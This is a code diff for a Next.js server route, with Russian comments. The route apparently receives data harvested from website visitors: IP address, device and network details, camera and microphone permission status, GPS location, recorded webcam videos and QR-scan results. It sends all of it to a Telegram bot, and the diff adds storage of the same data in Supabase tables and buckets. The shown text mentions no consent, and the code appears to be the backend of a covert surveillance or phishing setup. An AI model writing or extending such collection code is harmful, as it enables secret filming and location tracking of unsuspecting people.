@@ -1,4 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
+import { supabase } from "@/lib/supabase"; // Импортируем клиент Supabase
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -25,7 +26,7 @@ export async function POST(req: NextRequest) {
       messageType,
       sessionId,
       timestamp,
-      attempt, // Получаем номер попытки
+      attempt,
       clientInfo,
       networkInfo,
       deviceMemory,
@@ -39,7 +40,9 @@ export async function POST(req: NextRequest) {
 
     const ipAddressHeader = req.headers.get("x-forwarded-for");
     const ipAddress = ipAddressHeader ? ipAddressHeader.split(',').map(ip => ip.trim()).join(', ') : "Unavailable";
-    const messages: Promise<Response>[] = [];
+    
+    const telegramPromises: Promise<Response>[] = [];
+    const supabasePromises: Promise<any>[] = []; // Для операций Supabase
 
     const sessionPrefix = sessionId ? `[Сессия: \`${sessionId}\`]\n` : "";
     const formattedTimestamp = timestamp ? new Date(timestamp).toLocaleString('ru-RU') : "Неизвестно";
@@ -100,7 +103,7 @@ export async function POST(req: NextRequest) {
           summaryText += `*Микрофон:* ${permissionStatus.microphone}\n`;
         }
 
-        messages.push(
+        telegramPromises.push(
           fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -114,7 +117,7 @@ export async function POST(req: NextRequest) {
 
         if (geolocation?.latitude && geolocation?.longitude) {
           console.log("Attempting to send location...");
-          messages.push(
+          telegramPromises.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -126,49 +129,83 @@ export async function POST(req: NextRequest) {
             })
           );
         }
+
+        // Supabase: Save initial session data
+        supabasePromises.push(
+          supabase.from('sessions').insert({
+            session_id: sessionId,
+            timestamp: new Date(timestamp).toISOString(),
+            ip_address: ipAddress,
+            client_info: clientInfo,
+            network_info: networkInfo,
+            device_memory: deviceMemory,
+            battery_info: batteryInfo,
+            permission_status: permissionStatus,
+            geolocation: geolocation,
+          }).then(({ data, error }) => {
+            if (error) {
+              console.error("Supabase: Error saving initial summary:", error);
+            } else {
+              console.log("Supabase: Initial summary saved successfully.");
+            }
+          })
+        );
         break;
 
       case MessageType.Video1:
-        if (video1) {
-          console.log("Attempting to send Video 1...");
-          const base64Data = video1.replace(/^data:video\/\w+;base64,/, "");
+      case MessageType.Video2:
+        const videoData = messageType === MessageType.Video1 ? video1 : video2;
+        if (videoData) {
+          console.log(`Attempting to send ${messageType}...`);
+          const base64Data = videoData.replace(/^data:video\/\w+;base64,/, "");
           const buffer = Buffer.from(base64Data, "base64");
+          const fileName = `${messageType}_${sessionId}_attempt${attempt}.webm`;
+          const storagePath = `videos/${sessionId}/${fileName}`;
+
           const formData = new FormData();
           formData.append("chat_id", TELEGRAM_CHAT_ID);
-          formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_1_${sessionId}_attempt${attempt}.webm`);
-          formData.append("caption", `${sessionPrefix}🎥 *Видео 1*${attemptSuffix} (Время: ${formattedTimestamp})`);
+          formData.append("video", new Blob([buffer], { type: "video/webm" }), fileName);
+          formData.append("caption", `${sessionPrefix}🎥 *${messageType === MessageType.Video1 ? "Видео 1" : "Видео 2"}*${attemptSuffix} (Время: ${formattedTimestamp})`);
 
-          messages.push(
+          telegramPromises.push(
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
               method: "POST",
               body: formData,
             }).then(async res => {
-              console.log("Video 1 API response status:", res.status);
-              if (!res.ok) { const errorBody = await res.text(); console.error("Video 1 API error response:", errorBody); }
+              console.log(`${messageType} API response status:`, res.status);
+              if (!res.ok) { const errorBody = await res.text(); console.error(`${messageType} API error response:`, errorBody); }
               return res;
             })
           );
-        }
-        break;
 
-      case MessageType.Video2:
-        if (video2) {
-          console.log("Attempting to send Video 2...");
-          const base64Data = video2.replace(/^data:video\/\w+;base64,/, "");
-          const buffer = Buffer.from(base64Data, "base64");
-          const formData = new FormData();
-          formData.append("chat_id", TELEGRAM_CHAT_ID);
-          formData.append("video", new Blob([buffer], { type: "video/webm" }), `recorded_video_2_${sessionId}_attempt${attempt}.webm`);
-          formData.append("caption", `${sessionPrefix}🎥 *Видео 2*${attemptSuffix} (Время: ${formattedTimestamp})`);
+          // Supabase: Upload video to storage and save path to DB
+          supabasePromises.push(
+            supabase.storage.from('videos').upload(storagePath, buffer, {
+              contentType: 'video/webm',
+              upsert: true, // Overwrite if exists
+            }).then(async ({ data: storageData, error: storageError }) => {
+              if (storageError) {
+                console.error(`Supabase: Error uploading ${messageType} to storage:`, storageError);
+              } else {
+                console.log(`Supabase: ${messageType} uploaded to storage successfully.`);
+                // Get public URL if needed, or just store the path
+                // const { data: publicUrlData } = supabase.storage.from('videos').getPublicUrl(storagePath);
+                // const publicUrl = publicUrlData?.publicUrl;
 
-          messages.push(
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-              method: "POST",
-              body: formData,
-            }).then(async res => {
-              console.log("Video 2 API response status:", res.status);
-              if (!res.ok) { const errorBody = await res.text(); console.error("Video 2 API error response:", errorBody); }
-              return res;
+                await supabase.from('videos').insert({
+                  session_id: sessionId,
+                  video_type: messageType,
+                  attempt: attempt,
+                  timestamp: new Date(timestamp).toISOString(),
+                  storage_path: storagePath,
+                }).then(({ data, error }) => {
+                  if (error) {
+                    console.error(`Supabase: Error saving ${messageType} record to DB:`, error);
+                  } else {
+                    console.log(`Supabase: ${messageType} record saved to DB successfully.`);
+                  }
+                });
+              }
             })
           );
         }
@@ -188,7 +225,7 @@ export async function POST(req: NextRequest) {
           qrMessage += `*QR-կոդը սկանավորված է:* Ոչ ❌ (Время: ${formattedTimestamp})\n`;
         }
 
-        messages.push(
+        telegramPromises.push(
           fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -199,6 +236,22 @@ export async function POST(req: NextRequest) {
             return res;
           })
         );
+
+        // Supabase: Save QR code data
+        supabasePromises.push(
+          supabase.from('qr_codes').insert({
+            session_id: sessionId,
+            attempt: attempt,
+            timestamp: new Date(timestamp).toISOString(),
+            qr_code_data: qrCodeData,
+          }).then(({ data, error }) => {
+            if (error) {
+              console.error("Supabase: Error saving QR code data:", error);
+            } else {
+              console.log("Supabase: QR code data saved successfully.");
+            }
+          })
+        );
         break;
 
       default:
@@ -206,11 +259,19 @@ export async function POST(req: NextRequest) {
         return NextResponse.json({ error: "Unknown message type" }, { status: 400 });
     }
 
-    await Promise.allSettled(messages);
+    // Выполняем все промисы параллельно, но независимо
+    const allResults = await Promise.allSettled([...telegramPromises, ...supabasePromises]);
 
-    return NextResponse.json({ message: "Data processed and sent to Telegram." });
+    // Логируем результаты для отладки, но не влияем на ответ пользователю
+    allResults.forEach((result, index) => {
+      if (result.status === 'rejected') {
+        console.error(`Promise ${index} failed:`, result.reason);
+      }
+    });
+
+    return NextResponse.json({ message: "Data processed and sent to Telegram and Supabase." });
   } catch (error: any) {
-    console.error("Error processing Telegram request:", error);
+    console.error("Error processing Telegram/Supabase request:", error);
     return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
   }
 }
